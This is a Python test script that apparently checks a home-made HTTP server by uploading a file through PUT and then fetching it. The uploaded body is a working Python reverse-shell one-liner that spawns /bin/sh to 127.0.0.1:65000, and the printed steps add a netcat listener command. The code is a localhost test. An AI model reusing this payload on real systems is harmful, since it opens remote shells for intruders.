import socket
import os

TCP_IP = '127.0.0.1'
BUFFER_SIZE = 1024
red = "\033[0;31m"
green = "\033[0;32m"
blue = "\033[0;34m"
nc = "\033[0m"

def reverse_shell_upload(port):
    print(red + "Test Reverse Shell Upload" + nc)
    print(green + "Expected: You should be able to execute a reverse shell" + nc)
    print(red + "It is not the server program responsibility to prevent this type of attack so it should work" + nc)
    print(green + "This is just a test for fun ! " + nc + "👍")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TCP_IP, port))
    toSend = "PUT /reverse_shell.sh HTTP/1.1\r\nHost: localhost:" + str(port) + "\r\n"
    toSend += "Content-Type: application/x-www-form-urlencoded\r\n"
    toSend += "Content-Length: 223\r\n\r\n"
    toSend += "python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",65000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'"
    s.send(bytes(toSend, encoding="utf-8"))
    data = s.recv(1000)
    s.close()
    print(blue + "I received:\n" + nc)
    print(data.decode("ascii"))
    print(green + "Did you succeed ?" + nc)
    print("On a different terminal, launch: " + blue + "nc -lvp 65000" + nc)
    print("On another terminal, launch " + blue + "curl localhost:" + str(port) + "/putStuff/reverse_shell.sh" + nc)
    print("So did you get your reverse shell ? If yes " + red + "Congrats" + nc + "!!!")
    input()

